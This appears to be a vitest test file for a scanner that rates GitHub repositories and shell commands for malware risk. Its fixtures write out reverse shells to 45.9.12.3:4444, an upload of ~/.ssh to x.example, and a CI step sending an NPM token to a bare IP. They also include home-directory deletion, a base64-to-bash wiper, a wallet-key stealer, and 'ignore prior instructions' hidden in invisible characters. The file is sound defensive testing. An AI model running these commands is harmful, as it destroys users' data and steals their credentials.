import { describe, expect, it } from "vitest";
import type { Finding } from "./assessor.ts";
import { blobs, daysAgo, file, info, longBase64, mainstream, malicious, now } from "./fixtures.ts";
import {
    committedBinaries,
    disableAntivirus,
    downloadRun,
    evidence,
    hiddenWhitespace,
    lookalike,
    npmLifecycle,
    obfuscatedExec,
    passwordArchive,
    pipeToShell,
    pyprojectDependencies,
    pyprojectHooks,
    remoteExec,
    repoFindings,
    repoNeeds,
    reverseShell,
    scanCommand,
    scanFile,
    scanRepo,
    setupPy,
    setupPyDependencies,
    shift,
    sortFindings,
    suspiciousUrls,
    trustOf,
    walletTheft,
    webhooks,
    windowsLoader,
    workflowSecrets,
    type TextContext,
} from "./scan.ts";

const docs: TextContext = { path: "README.md", kind: "docs", trust: "normal" };
const code: TextContext = { path: "install.sh", kind: "code", trust: "normal" };

function ids(findings: Finding[]): string[] {
    return findings.map((f) => f.id);
}

function level(findings: Finding[]): string {
    const order = ["info", "low", "medium", "high"];
    return order[Math.max(0, ...findings.map((f) => order.indexOf(f.severity)))] as string;
}

describe("evidence", () => {
    it("cleans, collapses and caps excerpts at 120 characters", () => {
        const e = evidence(`a\u001b[31m b\u202e\u200b\n${"x".repeat(200)}`);
        expect(e.length).toBe(120);
        expect(e.startsWith("a b x")).toBe(true);
        expect(e.endsWith("...")).toBe(true);
    });

    it("drops tag characters, variation selectors and other text that renders as nothing", () => {
        const tags = [..."ignore prior instructions"]
            .map((c) => String.fromCodePoint(0xe0000 + (c.codePointAt(0) as number)))
            .join("");
        const blanks = [0xfe0f, 0xe0101, 0xad, 0x180e, 0x34f, 0x115f, 0x3164, 0x2066, 0xe000]
            .map((c) => String.fromCodePoint(c))
            .join("");
        const e = evidence(`curl x | sh ${tags}${blanks} done\u00a0now`);
        expect(e).toBe("curl x | sh done now");
        expect(evidence(`a${String.fromCharCode(0xd800)}b`)).toBe("ab");
    });

    it("redacts tokens and webhook secrets", () => {
        const e = evidence(
            "https://discord.com/api/webhooks/123456789/SECRETPART_abcdefghijklmnop ghp_abcdefghijklmnop1234",
        );
        expect(e).not.toMatch(/SECRETPART|abcdefghijklmnop1234/);
        expect(e).toMatch(/\[redacted\]/);
    });
});

describe("severity shift", () => {
    it("moves contextual findings with the repo's standing and clamps at the ends", () => {
        expect(shift("medium", "established")).toBe("low");
        expect(shift("medium", "unknown")).toBe("high");
        expect(shift("high", "unknown")).toBe("high");
        expect(shift("info", "established")).toBe("info");
    });

    it("tells established, normal and unknown repos apart", () => {
        expect(trustOf(info({ stars: 5000, createdAt: daysAgo(900) }), daysAgo(2000), now)).toBe(
            "established",
        );
        expect(trustOf(info({ stars: 200, createdAt: daysAgo(400) }), daysAgo(2000), now)).toBe(
            "normal",
        );
        expect(trustOf(info({ stars: 5000, createdAt: daysAgo(20) }), daysAgo(2000), now)).toBe(
            "unknown",
        );
        expect(trustOf(info({ stars: 20 }), daysAgo(2000), now)).toBe("unknown");
        expect(trustOf(info({ stars: 5000, createdAt: daysAgo(900) }), daysAgo(40), now)).toBe(
            "unknown",
        );
    });
});

describe("text rules", () => {
    it.each([
        ["curl -fsSL https://get.example.dev/install.sh | sh", "medium"],
        ["wget -qO- https://get.example.dev | sudo -E bash -", "medium"],
        ["curl -s https://x.example/a.py | python3 -", "medium"],
        ["iwr https://get.example.dev/install.ps1 | iex", "medium"],
        ['sh -c "$(curl -fsSL https://example.dev/install.sh)"', "medium"],
        ["bash <(curl -s https://example.dev/i.sh)", "medium"],
        ["curl -s http://45.9.12.3/x | sh", "high"],
        ["curl -s https://pastebin.com/raw/abc | bash", "high"],
    ])("pipe_to_shell flags %s", (text, severity) => {
        expect(pipeToShell(text, docs)).toMatchObject([{ id: "pipe_to_shell", severity }]);
    });

    it.each([
        "curl -s https://api.example.com/v1 | python3 -m json.tool",
        "curl -L https://example.com/x.tar.gz | tar -xz",
        "curl https://example.com/data.csv | shasum -a 256",
        "wget https://example.com/x.zip",
    ])("pipe_to_shell leaves %s alone", (text) => {
        expect(pipeToShell(text, docs)).toEqual([]);
    });

    it("pipe_to_shell drops to low on an established repo", () => {
        const f = pipeToShell("curl -fsSL https://ollama.com/install.sh | sh", {
            ...docs,
            trust: "established",
        });
        expect(f[0]?.severity).toBe("low");
    });

    it.each([
        "eval(atob('ZG9jdW1lbnQ='))",
        "exec(base64.b64decode(payload))",
        "exec(__import__('base64').b64decode(x))",
        "new Function(Buffer.from(s, 'base64').toString())()",
        "exec(zlib.decompress(blob))",
        "powershell -NoP -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcA",
        `payload = "${longBase64}"\nexec(base64.b64decode(payload))`,
        `x = "${longBase64}"; data = atob(x)`,
    ])("obfuscated_exec flags %s", (text) => {
        expect(obfuscatedExec(text, code)).toMatchObject([
            { id: "obfuscated_exec", severity: "high" },
        ]);
    });

    it.each([
        "exec(compile(open('version.py').read(), 'version.py', 'exec'))",
        `![logo](data:image/png;base64,${"iVBORw0KGgo".repeat(40)})`,
        `const icon = "${longBase64}";`,
        "eval(JSON.parse(x))",
    ])("obfuscated_exec leaves %s alone", (text) => {
        expect(obfuscatedExec(text, code)).toEqual([]);
    });

    it("flags code that runs a network read or a decoded payload", () => {
        const cases: [string, string][] = [
            ["import requests\nexec(requests.get('https://x.dev/p').text)\n", "remote_exec"],
            ["fetch('https://x.dev/c').then((r) => r.text()).then(eval)", "remote_exec"],
            ["eval(compile(base64.b64decode(payload), '<s>', 'exec'))", "obfuscated_exec"],
            ["os.system(base64.b64decode('Y3VybCB4IHwgc2g=').decode())", "obfuscated_exec"],
            [
                "require('child_process').execSync(Buffer.from(p, 'base64').toString())",
                "obfuscated_exec",
            ],
        ];
        for (const [text, id] of cases) {
            expect(ids(remoteExec(text, code).concat(obfuscatedExec(text, code)))).toEqual([id]);
        }
        expect(remoteExec("exec(open('version.py').read())", code)).toEqual([]);
        expect(remoteExec("eval(config.get('x'))", code)).toEqual([]);
        expect(reverseShell("nc -e /bin/sh 45.9.12.3 4444", docs)[0]?.severity).toBe("medium");
        expect(windowsLoader("Run mshta https://x.dev/a.hta", docs)[0]?.severity).toBe("medium");
        expect(downloadRun("curl -o a.sh https://x.dev/a && bash a.sh", code)[0]?.id).toBe(
            "download_run",
        );
    });

    it("hidden_whitespace flags code after a long blank run but not in docs", () => {
        const text = `print("hi")${" ".repeat(400)}import os;os.system("x")`;
        expect(hiddenWhitespace(text, code)).toMatchObject([
            { id: "hidden_whitespace", severity: "high" },
        ]);
        expect(hiddenWhitespace(text, docs)).toEqual([]);
        expect(hiddenWhitespace("print('hi')    # aligned", code)).toEqual([]);
    });

    it("webhook flags hardcoded Discord and Telegram endpoints but not placeholders", () => {
        const discord =
            "https://discord.com/api/webhooks/123456789012345678/AbCdEfGhIjKlMnOpQrStUvWxYz012345";
        const telegram =
            "https://api.telegram.org/bot123456789:AAHdqTcvCH1vGWJxfSeofSAs0K5PALDsaw/sendMessage";
        expect(webhooks(discord, code)).toMatchObject([{ id: "webhook", severity: "high" }]);
        expect(webhooks(telegram, code)[0]?.evidence).not.toMatch(/AAHdqTcv/);
        expect(webhooks("https://discord.com/api/webhooks/YOUR_ID/YOUR_TOKEN", code)).toEqual([]);
        expect(webhooks("https://api.telegram.org/bot${TOKEN}/sendMessage", code)).toEqual([]);
    });

    it("suspicious_url flags public bare IPs and paste sites, not local addresses", () => {
        expect(suspiciousUrls("get http://45.9.12.3:8080/p", code)).toMatchObject([
            { id: "suspicious_url", severity: "medium" },
        ]);
        expect(suspiciousUrls("see https://pastebin.com/raw/x1", code)[0]?.title).toMatch(/paste/);
        expect(suspiciousUrls("open http://127.0.0.1:7860 or http://192.168.1.5", code)).toEqual(
            [],
        );
        expect(suspiciousUrls("https://github.com/acme/tool", code)).toEqual([]);
    });

    it("password_archive flags a password handed out for an archive", () => {
        expect(passwordArchive("Download the zip, password: 2025", docs)).toMatchObject([
            { id: "password_archive", severity: "high" },
        ]);
        expect(passwordArchive("Extract the archive (pass - github)", docs)).toHaveLength(1);
        expect(passwordArchive("Set the admin password: in settings", docs)).toEqual([]);
        expect(passwordArchive("Unzip it, then set a password in config", docs)).toEqual([]);
    });

    it("disable_antivirus flags requests to switch protection off", () => {
        expect(disableAntivirus("Please disable Windows Defender first", docs)).toMatchObject([
            { id: "disable_antivirus", severity: "medium" },
        ]);
        expect(disableAntivirus("Add an exclusion in Defender for the folder", docs)).toHaveLength(
            1,
        );
        expect(disableAntivirus("Windows Defender keeps you safe", docs)).toEqual([]);
    });

    it("wallet_theft flags key or seed handling next to code that sends data out", () => {
        const stealer =
            "seed = open(os.path.expanduser('~/.config/solana/id.json')).read()\nrequests.post(url, data=seed)";
        expect(walletTheft(stealer, code)).toMatchObject([
            { id: "wallet_theft", severity: "high" },
        ]);
        expect(walletTheft("Never share your seed phrase with anyone.", docs)).toEqual([]);
        expect(walletTheft("requests.post(url, json=report)", code)).toEqual([]);
    });
});

describe("manifest and workflow rules", () => {
    it("npm_lifecycle is high when an install hook downloads or runs code", () => {
        const pkg = (scripts: Record<string, string>) =>
            file("package.json", JSON.stringify({ scripts }));
        expect(
            npmLifecycle(pkg({ postinstall: "curl -s https://x.example/a | sh" }), "normal"),
        ).toMatchObject([{ id: "npm_lifecycle", severity: "high" }]);
        expect(
            npmLifecycle(pkg({ preinstall: "node -e \"require('child_process')\"" }), "normal")[0]
                ?.severity,
        ).toBe("high");
        expect(npmLifecycle(pkg({ postinstall: "node-gyp rebuild" }), "normal")[0]?.severity).toBe(
            "low",
        );
        expect(npmLifecycle(pkg({ postinstall: "node-gyp rebuild" }), "unknown")[0]?.severity).toBe(
            "medium",
        );
        expect(npmLifecycle(pkg({ prepare: "husky" }), "established")[0]?.severity).toBe("info");
        expect(npmLifecycle(pkg({ build: "tsc", test: "vitest" }), "normal")).toEqual([]);
        expect(npmLifecycle(file("package.json", "{not json"), "normal")).toEqual([]);
    });

    it("setup.py rules flag network calls, decoding, exec and install hooks", () => {
        const net = setupPy(
            file("setup.py", "import urllib.request\nurllib.request.urlretrieve(u, 'x')"),
            "normal",
        );
        expect(net).toMatchObject([{ id: "setup_py_network", severity: "high" }]);
        const dec = setupPy(
            file("setup.py", "import base64\ncode = base64.b64decode(blob)"),
            "normal",
        );
        expect(ids(dec)).toContain("setup_py_decode");
        const ex = setupPy(file("setup.py", "exec(payload)"), "normal");
        expect(ex).toMatchObject([{ id: "setup_py_exec", severity: "medium" }]);
        const hook = setupPy(
            file("setup.py", "setup(cmdclass={'install': PostInstall})"),
            "normal",
        );
        expect(hook).toMatchObject([{ id: "setup_py_install_hook", severity: "low" }]);
        const plain = setupPy(
            file(
                "setup.py",
                "exec(open('pkg/version.py').read())\nsetup(name='pkg', install_requires=['requests'])",
            ),
            "normal",
        );
        expect(plain).toEqual([]);
    });

    it("build_hook flags a custom pyproject build hook", () => {
        const hook = file("pyproject.toml", "[tool.hatch.build.hooks.custom]\npath = 'hooks.py'\n");
        expect(pyprojectHooks(hook, "normal")).toMatchObject([
            { id: "build_hook", severity: "low" },
        ]);
        const plain = file(
            "pyproject.toml",
            '[build-system]\nrequires = ["hatchling"]\nbuild-backend = "hatchling.build"\n',
        );
        expect(pyprojectHooks(plain, "normal")).toEqual([]);
    });

    it("workflow_secrets flags secrets sent to outside hosts", () => {
        const dump = file(".github/workflows/x.yml", "run: echo '${{ toJSON(secrets) }}' > s.json");
        expect(workflowSecrets(dump, "normal")).toMatchObject([
            { id: "workflow_secrets", severity: "high" },
        ]);
        const exfil = file(
            ".github/workflows/x.yml",
            'steps:\n  - run: curl -d "${{ secrets.NPM_TOKEN }}" https://45.9.12.3/collect',
        );
        expect(workflowSecrets(exfil, "normal")[0]?.severity).toBe("high");
        const deploy = file(
            ".github/workflows/x.yml",
            'steps:\n  - run: curl -H "Authorization: Bearer ${{ secrets.DEPLOY }}" https://api.vercel.com/v1/deploy',
        );
        expect(workflowSecrets(deploy, "normal")).toMatchObject([{ severity: "low" }]);
        const github = file(
            ".github/workflows/x.yml",
            '  - run: curl -H "token ${{ secrets.GITHUB_TOKEN }}" https://api.github.com/repos/a/b/releases',
        );
        expect(workflowSecrets(github, "normal")).toEqual([]);
    });
});

describe("repo rules", () => {
    it("flags young repos and owners, few stars, archived and unlicensed repos", () => {
        const young = info({
            stars: 3,
            forks: 0,
            createdAt: daysAgo(4),
            archived: true,
            license: null,
        });
        const f = repoFindings(young, daysAgo(10), now, "unknown");
        expect(ids(f)).toEqual(
            expect.arrayContaining([
                "young_repo",
                "young_owner",
                "few_stars",
                "archived",
                "no_license",
            ]),
        );
        expect(f.find((x) => x.id === "young_repo")?.severity).toBe("medium");
        expect(f.find((x) => x.id === "young_owner")?.severity).toBe("medium");
        const settled = repoFindings(info(), daysAgo(3000), now, "normal");
        expect(settled).toEqual([]);
    });

    it("lookalike_name flags a young or barely starred copy of a popular repo under another owner", () => {
        const copy = info({
            owner: "sd-official",
            repo: "stable-diffusion-webui",
            stars: 4,
            createdAt: daysAgo(6),
        });
        expect(lookalike(copy, daysAgo(8), now)).toMatchObject([
            { id: "lookalike_name", severity: "high" },
        ]);
        const homoglyph = info({
            owner: "comfy-tools",
            repo: "ComfyUl",
            stars: 2,
            createdAt: daysAgo(6),
        });
        expect(lookalike(homoglyph, null, now)).toHaveLength(1);
        const fork = info({ owner: "someone", repo: "ComfyUI", stars: 0, fork: true });
        expect(lookalike(fork, null, now)[0]?.severity).toBe("medium");
        const real = info({ owner: "comfyanonymous", repo: "ComfyUI", stars: 3 });
        expect(lookalike(real, null, now)).toEqual([]);
        const moved = info({ owner: "ggerganov", repo: "llama.cpp", stars: 3 });
        expect(lookalike(moved, null, now)).toEqual([]);
        const settledFork = info({
            owner: "vladmandic",
            repo: "stable-diffusion-webui",
            stars: 900,
            createdAt: daysAgo(1200),
        });
        expect(lookalike(settledFork, daysAgo(3000), now)).toEqual([]);
        expect(lookalike(info({ repo: "whisperx-tools", stars: 1 }), null, now)).toEqual([]);
    });

    it("reads Python dependencies only from dependency lists and tables", () => {
        const pyproject = [
            "[project]",
            'name = "mytool"',
            'keywords = ["transformers", "vllm"]',
            'classifiers = ["Environment :: GPU :: NVIDIA CUDA"]',
            "dependencies = [",
            '    "uvicorn[standard]>=0.30",',
            '    "torch>=2.3",',
            "]",
            "[project.optional-dependencies]",
            "gpu = [\"xformers; sys_platform == 'linux'\"]",
            "[project.scripts]",
            'diffusers = "mytool.cli:main"',
            "[tool.poetry.dependencies]",
            'python = "^3.10"',
            'accelerate = { version = "^1" }',
        ].join("\n");
        expect(pyprojectDependencies(pyproject)).toEqual([
            "uvicorn",
            "torch",
            "xformers",
            "accelerate",
        ]);
        const setup = [
            "setup(",
            '    name="mytool",',
            '    keywords=["vllm"],',
            '    install_requires=["numpy", "torch>=2"],',
            '    extras_require={"gpu": ["flash-attn"], "dev": ["pytest"]},',
            ")",
        ].join("\n");
        expect(setupPyDependencies(setup)).toEqual(["numpy", "torch", "flash-attn", "pytest"]);
        const keywordsOnly = file(
            "pyproject.toml",
            '[project]\nname = "mytool"\nkeywords = ["transformers", "vllm"]\ndependencies = ["click>=8"]\n',
        );
        expect(repoNeeds([keywordsOnly])).toMatchObject({ ml: false, gpu: false, cuda: false });
    });

    it("stays linear on repeated dependency lists", () => {
        const kib = 256 * 1024;
        const inputs = [
            "[project]\n" + "dependencies = [\n".repeat(kib / 17),
            "install_requires=[".repeat(kib / 18),
            `extras_require={${"[".repeat(kib)}`,
        ];
        for (const text of inputs) {
            const started = performance.now();
            pyprojectDependencies(text);
            setupPyDependencies(text);
            expect(performance.now() - started).toBeLessThan(500);
        }
    });

    it("lookalike_name leaves an old repo with a plain shared name alone", () => {
        const old = { stars: 3, createdAt: daysAgo(800) };
        for (const repo of ["piper", "TTS", "bark", "whisper", "transformers", "kokoro"]) {
            expect(lookalike(info({ owner: "alice", repo, ...old }), daysAgo(3000), now)).toEqual(
                [],
            );
        }
        const fresh = info({ owner: "alice", repo: "piper", stars: 3, createdAt: daysAgo(10) });
        expect(lookalike(fresh, daysAgo(3000), now)).toMatchObject([{ severity: "medium" }]);
        const webui = info({ owner: "alice", repo: "stable-diffusion-webui", ...old });
        expect(lookalike(webui, daysAgo(3000), now)).toMatchObject([{ severity: "high" }]);
    });

    it("lure_terms flags cracks and cheats but not cheat sheets", () => {
        const lure = repoFindings(
            info({ repo: "valorant-aimbot", description: "free undetected" }),
            daysAgo(3000),
            now,
            "normal",
        );
        expect(ids(lure)).toContain("lure_terms");
        const sheet = repoFindings(
            info({ repo: "git-cheat-sheet", description: "a git cheatsheet" }),
            daysAgo(3000),
            now,
            "normal",
        );
        expect(ids(sheet)).not.toContain("lure_terms");
    });

    it("committed_binaries groups executables, scripts and archives and skips test data", () => {
        const tree = blobs(
            "Setup.exe",
            "lib/a.dll",
            "run.vbs",
            "start.bat",
            "x.zip",
            "tests/fixtures/data.zip",
            "gradle/wrapper/gradle-wrapper.jar",
        );
        const f = committedBinaries(tree, "normal");
        expect(f.map((x) => x.severity)).toEqual(["medium", "medium", "low", "low"]);
        expect(f[0]?.evidence).toBe("Setup.exe, lib/a.dll");
        expect(committedBinaries(tree, "unknown")[0]?.severity).toBe("high");
        expect(
            committedBinaries(
                blobs("src/main.py", "tests/fixtures/data.zip", "gradlew.bat"),
                "normal",
            ),
        ).toEqual([]);
    });

    it("reads AI packages and CUDA needs from manifests and the final Dockerfile stage", () => {
        const ml = repoNeeds([
            file("requirements.txt", "torch>=2.1\nxformers==0.0.27 # fast attention\n-e .\n"),
        ]);
        expect(ml).toMatchObject({ ml: true, gpu: true, cuda: true });
        const plain = repoNeeds([file("requirements.txt", "requests\nclick\n")]);
        expect(plain).toMatchObject({ ml: false, gpu: false, cuda: false });
        const multi = repoNeeds([
            file(
                "Dockerfile",
                "FROM nvidia/cuda:12.4.1-devel AS build\nRUN make\nFROM ubuntu:24.04\nCOPY --from=build /x /x\n",
            ),
        ]);
        expect(multi.cuda).toBe(false);
        expect(
            repoNeeds([file("Dockerfile", "FROM nvidia/cuda:12.4.1-runtime-ubuntu22.04\n")]).cuda,
        ).toBe(true);
        expect(repoNeeds([file("README.md", "Needs about 8 GB VRAM.")]).gpu).toBe(true);
        expect(
            repoNeeds([
                file(
                    "package.json",
                    JSON.stringify({ dependencies: { "@huggingface/transformers": "^3" } }),
                ),
            ]).ml,
        ).toBe(true);
    });
});

describe("whole repos", () => {
    it("rates a popular, old, licensed repo with ordinary install steps as low risk", () => {
        const scan = scanRepo(mainstream(), now);
        expect(scan.trust).toBe("established");
        expect(level(scan.findings)).not.toMatch(/medium|high/);
        expect(scan.facts).toMatchObject({
            stars: 68_000,
            license: "BSD-3-Clause",
            repo: "pallets/flasky",
        });
        expect(ids(scan.findings)).toContain("pipe_to_shell");
    });

    it("rates a fresh lookalike full of lures as high risk", () => {
        const scan = scanRepo(malicious(), now);
        expect(scan.trust).toBe("unknown");
        expect(level(scan.findings)).toBe("high");
        expect(ids(scan.findings)).toEqual(
            expect.arrayContaining([
                "lookalike_name",
                "npm_lifecycle",
                "obfuscated_exec",
                "setup_py_decode",
                "pipe_to_shell",
                "webhook",
                "password_archive",
                "disable_antivirus",
                "committed_binaries",
                "young_owner",
            ]),
        );
        for (const f of scan.findings) expect((f.evidence ?? "").length).toBeLessThanOrEqual(120);
    });

    it("cleans repo-controlled file names before they reach titles", () => {
        const name = `.github/workflows/${String.fromCharCode(0x202e)}evil${"x".repeat(80)}.yml`;
        const f = scanFile(file(name, "run: echo '${{ toJSON(secrets) }}' > s"), "normal");
        expect(f[0]?.id).toBe("workflow_secrets");
        expect(f[0]?.title).not.toContain(String.fromCharCode(0x202e));
        expect(f[0]?.title.length).toBeLessThan(100);
    });

    it("stays fast on hostile input at the largest file cap", () => {
        const mib = 1024 * 1024;
        const inputs = [
            " ".repeat(mib),
            "curl ".repeat(mib / 5),
            "curl x | sh ".repeat(mib / 12),
            `cmdclass = {${"'a',".repeat(mib / 4)}`,
            "mnemonic ".repeat(mib / 9),
            "-r".repeat(mib / 2),
            `"${"a".repeat(199)}" `.repeat(mib / 202),
            "eval(".repeat(mib / 5),
            "curl -o x && ".repeat(mib / 13),
            `curl ${"-o ".repeat(100)}\n`.repeat(mib / 302),
            ">& /dev/tcp/".repeat(mib / 12),
            "nc -e ".repeat(mib / 6),
            "certutil ".repeat(mib / 9),
            "exec( await (".repeat(mib / 13),
            "| /a/b/c/d/env ".repeat(mib / 15),
        ];
        for (const text of inputs) {
            for (const path of ["setup.py", "README.md", "install.sh", "package.json"]) {
                const started = performance.now();
                scanFile(file(path, text), "normal");
                expect(performance.now() - started).toBeLessThan(1500);
            }
        }
    });

    it("stays fast on a 256 KiB file of blank lines in every file kind", () => {
        const kib = 256 * 1024;
        const inputs = ["\n".repeat(kib), " \n".repeat(kib / 2), "\t\r\n".repeat(kib / 3)];
        const paths = [
            "pyproject.toml",
            "setup.py",
            "package.json",
            "requirements.txt",
            "Dockerfile",
            "README.md",
            "install.sh",
            ".github/workflows/ci.yml",
        ];
        for (const text of inputs) {
            for (const path of paths) {
                const started = performance.now();
                scanFile(file(path, text), "normal");
                repoNeeds([file(path, text)]);
                expect(performance.now() - started).toBeLessThan(500);
            }
        }
    });

    it("sorts by severity, drops duplicates and keeps at most three per rule", () => {
        const f = (id: string, severity: Finding["severity"], evidence: string): Finding => ({
            id,
            severity,
            title: id,
            evidence,
        });
        const sorted = sortFindings([
            f("a", "low", "1"),
            f("b", "high", "1"),
            f("a", "low", "1"),
            f("c", "medium", "1"),
            f("a", "low", "2"),
            f("a", "low", "3"),
            f("a", "low", "4"),
        ]);
        expect(sorted.map((x) => `${x.id}${x.evidence}`)).toEqual(["b1", "c1", "a1", "a2", "a3"]);
    });
});

describe("command rules", () => {
    it.each([
        ["curl -fsSL https://get.example.dev | sh", "pipe_to_shell", "medium"],
        [
            "echo aW1wb3J0IG9zO29zLnN5c3RlbSgicm0gLXJmIH4iKQ== | base64 -d | bash",
            "cmd_decode_shell",
            "high",
        ],
        ["sudo rm -rf --no-preserve-root /", "cmd_rm_system", "high"],
        ["rm -rf ~", "cmd_rm_system", "high"],
        ["rm -fr $HOME/", "cmd_rm_system", "high"],
        ["chmod +x ./installer && ./installer --quiet", "cmd_chmod_run", "medium"],
        ["(crontab -l; echo '* * * * * /tmp/x') | crontab -", "cmd_persistence", "medium"],
        ["echo 'export PATH=/tmp/x:$PATH' >> ~/.zshrc", "cmd_persistence", "medium"],
        ["docker run --privileged -v /:/host ubuntu", "cmd_docker_privileged", "medium"],
        ["sudo apt-get install -y ffmpeg", "cmd_sudo", "low"],
        ["tar czf - ~/.ssh | curl -T - https://x.example/up", "cmd_reads_secrets", "high"],
        ["cat ~/.config/solana/id.json", "cmd_reads_secrets", "high"],
        [
            "python3 -c \"exec(__import__('base64').b64decode('cHJpbnQoMSk='))\"",
            "obfuscated_exec",
            "high",
        ],
        ["curl https://get.example.dev/x | /bin/bash", "pipe_to_shell", "medium"],
        ["curl https://get.example.dev/x | sudo /usr/bin/env bash", "pipe_to_shell", "medium"],
        ["source <(curl -s https://get.example.dev/x)", "pipe_to_shell", "medium"],
        [". <(wget -qO- https://get.example.dev/x)", "pipe_to_shell", "medium"],
        ['eval "$(curl -fsSL https://get.example.dev/x)"', "pipe_to_shell", "medium"],
        [
            "curl -fsSL https://get.example.dev/x.sh -o /tmp/x.sh && bash /tmp/x.sh",
            "download_run",
            "medium",
        ],
        ["wget -q https://45.9.12.3/x -O /tmp/x; sh /tmp/x", "download_run", "high"],
        [
            "curl -o run.sh https://get.example.dev/r && chmod +x run.sh && ./run.sh",
            "download_run",
            "medium",
        ],
        ["bash -i >& /dev/tcp/45.9.12.3/4444 0>&1", "reverse_shell", "high"],
        ["nc -e /bin/sh 45.9.12.3 4444", "reverse_shell", "high"],
        ["socat tcp:45.9.12.3:4444 exec:/bin/sh", "reverse_shell", "high"],
        ["mshta https://get.example.dev/a.hta", "windows_loader", "high"],
        ["regsvr32 /s /n /u /i:https://get.example.dev/a.sct scrobj.dll", "windows_loader", "high"],
        [
            "certutil -urlcache -split -f https://get.example.dev/a.exe a.exe && a.exe",
            "windows_loader",
            "medium",
        ],
        [
            "python3 -c \"import urllib.request;exec(urllib.request.urlopen('https://x.dev/p').read())\"",
            "remote_exec",
            "high",
        ],
    ])("flags %s", (cmd, id, severity) => {
        expect(scanCommand(cmd)).toEqual(
            expect.arrayContaining([expect.objectContaining({ id, severity })]),
        );
    });

    it.each([
        "pip install -r requirements.txt",
        "npm install",
        "rm -rf ./build node_modules",
        "rm -rf ~/projects/demo/dist",
        "git clone https://github.com/openai/whisper",
        "ssh-keygen -t ed25519 -f ~/.ssh/bugnet -N ''",
        "cat ~/.ssh/id_ed25519.pub",
        "chmod 644 config.yml",
        "docker run -p 8080:80 nginx",
        "python app.py --port 7860",
        "curl -o model.bin https://example.dev/m.bin && sha256sum model.bin",
        "curl -fsSL https://example.dev/a.tgz -o a.tgz && tar xzf a.tgz",
        "nc -z localhost 8080",
        "certutil -hashfile setup.exe SHA256",
    ])("leaves %s alone", (cmd) => {
        expect(scanCommand(cmd)).toEqual([]);
    });
});
